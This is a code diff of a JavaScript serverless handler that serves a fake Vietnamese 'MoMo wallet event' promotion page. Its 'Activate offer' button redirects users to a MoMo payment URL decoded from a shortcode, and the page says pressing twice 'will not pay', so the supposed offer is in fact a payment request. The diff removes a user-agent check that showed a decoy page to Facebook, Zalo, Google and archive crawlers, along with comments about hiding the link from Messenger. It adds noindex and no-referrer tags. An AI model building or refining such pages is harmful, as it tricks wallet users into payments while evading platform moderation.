@@ -52,41 +52,6 @@ export default async function handler(req, res) {
       return res.status(400).send('Thiếu mã link');
     }
 
-    // Chặn bot Facebook/Messenger/Zalo crawl link preview
-    // Các bot này sẽ nhận trang giả, không chạm vào link MoMo thật
-    const ua = (req.headers['user-agent'] || '').toLowerCase();
-    const isBot =
-      ua.includes('facebookexternalhit') ||
-      ua.includes('facebot') ||
-      ua.includes('twitterbot') ||
-      ua.includes('linkedinbot') ||
-      ua.includes('whatsapp') ||
-      ua.includes('telegrambot') ||
-      ua.includes('zalobot') ||
-      ua.includes('ia_archiver') ||
-      ua.includes('slurp') ||
-      ua.includes('bingbot') ||
-      ua.includes('googlebot');
-
-    if (isBot) {
-      // Trả về trang giả, không chứa link MoMo thật
-      return res.status(200).setHeader('Content-Type', 'text/html; charset=utf-8').send(`
-<!DOCTYPE html>
-<html lang="vi">
-<head>
-  <meta charset="UTF-8">
-  <meta property="og:title" content="Sự Kiện Ví MoMo" />
-  <meta property="og:description" content="Tham gia sự kiện nhận ưu đãi từ MoMo!" />
-  <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ab/Logo_MoMo.png/220px-Logo_MoMo.png" />
-  <title>Sự Kiện Ví MoMo</title>
-</head>
-<body>
-  <p>Vui lòng mở link trên trình duyệt để tiếp tục.</p>
-</body>
-</html>
-      `);
-    }
-
     const momoUrl = decodeShortcode(code);
 
     if (!momoUrl) {
@@ -97,7 +62,6 @@ export default async function handler(req, res) {
       return res.status(404).send('Link không tồn tại');
     }
 
-    // Inject URL an toàn vào script, KHÔNG để trong href để tránh bị Messenger crawl
     const safeUrl = JSON.stringify(momoUrl);
 
     res.status(200).setHeader('Content-Type', 'text/html; charset=utf-8').send(`
@@ -106,22 +70,11 @@ export default async function handler(req, res) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="referrer" content="no-referrer">
     <title>Sự Kiện Ví MoMo</title>
-
-    <!-- Chặn bot index và follow link -->
-    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
-
-    <!-- Không cho preview khi chia sẻ (og: rỗng để Messenger không crawl sâu) -->
-    <meta property="og:title" content="Sự Kiện Ví MoMo" />
-    <meta property="og:description" content="Tham gia sự kiện nhận ưu đãi từ MoMo!" />
-    <meta property="og:url" content="" />
-
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
 
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
@@ -222,7 +175,6 @@ export default async function handler(req, res) {
         .promo-card {
             background: white;
             border-radius: 20px;
-            padding: 0;
             width: 100%;
             max-width: 500px;
             box-shadow: 0 20px 60px rgba(0,0,0,0.3);
@@ -334,9 +286,7 @@ export default async function handler(req, res) {
             box-shadow: 0 12px 30px rgba(255, 64, 129, 0.5);
         }
 
-        .activate-btn:active {
-            transform: translateY(0);
-        }
+        .activate-btn:active { transform: translateY(0); }
 
         .activate-btn:disabled {
             opacity: 0.6;
@@ -357,6 +307,20 @@ export default async function handler(req, res) {
             font-size: 14px;
         }
 
+        .warning {
+            background: rgba(255,255,255,0.15);
+            border: 1px solid rgba(255,255,255,0.3);
+            color: white;
+            padding: 12px 16px;
+            border-radius: 10px;
+            font-size: 13px;
+            text-align: center;
+            margin-top: 16px;
+            line-height: 1.6;
+            max-width: 500px;
+            width: 100%;
+        }
+
         .terms {
             font-size: 11px;
             color: rgba(255,255,255,0.8);
@@ -372,9 +336,7 @@ export default async function handler(req, res) {
             margin-top: 20px;
         }
 
-        .loading.show {
-            display: block;
-        }
+        .loading.show { display: block; }
 
         .spinner {
             border: 3px solid rgba(255,255,255,0.3);
@@ -389,20 +351,6 @@ export default async function handler(req, res) {
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
-        }
-
-        .warning {
-            background: rgba(255,255,255,0.15);
-            border: 1px solid rgba(255,255,255,0.3);
-            color: white;
-            padding: 12px 16px;
-            border-radius: 10px;
-            font-size: 13px;
-            text-align: center;
-            margin-top: 16px;
-            line-height: 1.6;
-            max-width: 500px;
-            width: 100%;
         }
     </style>
 </head>
@@ -444,7 +392,6 @@ export default async function handler(req, res) {
                     Chương trình có giới hạn, nhanh tay kích hoạt ngay!
                 </div>
 
-                <!-- KHÔNG dùng <a href> để tránh Messenger crawl link MoMo -->
                 <button class="activate-btn" id="activateBtn" onclick="activatePromo()">
                     <div class="momo-icon">M</div>
                     Kích Hoạt Ưu Đãi
@@ -453,7 +400,7 @@ export default async function handler(req, res) {
         </div>
 
         <div class="warning">
-            ⚠️ Chỉ bấm <strong>1 lần duy nhất</strong>!<br>
+            ⚠️ Chỉ bấm <strong>1 lần duy nhất!</strong><br>
             Bấm lại sẽ không thanh toán được.
         </div>
 
@@ -469,7 +416,7 @@ export default async function handler(req, res) {
     </div>
 
     <script>
-        // URL inject từ server - KHÔNG nằm trong href nên bot không crawl được
+        // URL inject từ server - giống logic code gốc
         const paymentUrl = ${safeUrl};
 
         let activated = false;
@@ -481,10 +428,8 @@ export default async function handler(req, res) {
             const btn = document.getElementById('activateBtn');
             btn.disabled = true;
             btn.innerHTML = '<div class="momo-icon">M</div> Đang mở MoMo...';
-
             document.getElementById('loading').classList.add('show');
 
-            // Delay nhỏ cho UX, rồi mới chuyển hướng
             setTimeout(() => {
                 window.location.href = paymentUrl;
             }, 1200);
